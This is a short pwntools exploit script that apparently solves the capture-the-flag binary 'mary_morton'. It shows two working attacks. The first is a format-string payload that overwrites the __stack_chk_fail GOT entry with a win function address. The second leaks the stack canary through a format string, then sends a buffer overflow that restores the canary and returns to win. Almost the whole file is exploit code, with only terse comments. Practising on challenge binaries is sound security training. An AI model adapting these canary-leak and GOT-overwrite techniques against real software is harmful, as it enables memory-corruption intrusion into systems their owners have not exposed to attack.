from pwn import *

p = process(['mary_morton'])

elf = ELF('./mary_morton')

# context.log_level = 'debug'

win = 0x04008db

stack_fail = elf.got['__stack_chk_fail']

# 0x00400944 -> printf on format_string
# format string 6
# 0x4008da
# 0x40 - 8 = 56
# 0x08da - 16

### First method, overwrite GOT stack_fail to win(). THe trigger using bof

payload = b"%64x%9$n"
payload += b"%2202x%10$hnAAAA"
payload += p64(stack_fail+2)
payload += p64(stack_fail)

# gdb.attach(p,gdbscript="""init-gef
# br *0x04009d9""") # on ret format string

# p.sendline(b'2')
# p.sendline(payload)
# p.sendlineafter(b'battle \n',b'1')
# p.send(b'A'*250)


### 2 method, leak stack canary then bof ret 2 win

p.recvuntil(b"battle \n")
p.sendline(b'2')
p.sendline(b'%23$llx')
canary = int(p.recvuntil(b'\n',drop=True),16)
p.sendlineafter(b'battle \n',b'1')

payload = b'A'*136
payload += p64(canary)
payload += b'B'*8 # junk
payload += p64(win)

p.send(payload)

p.interactive()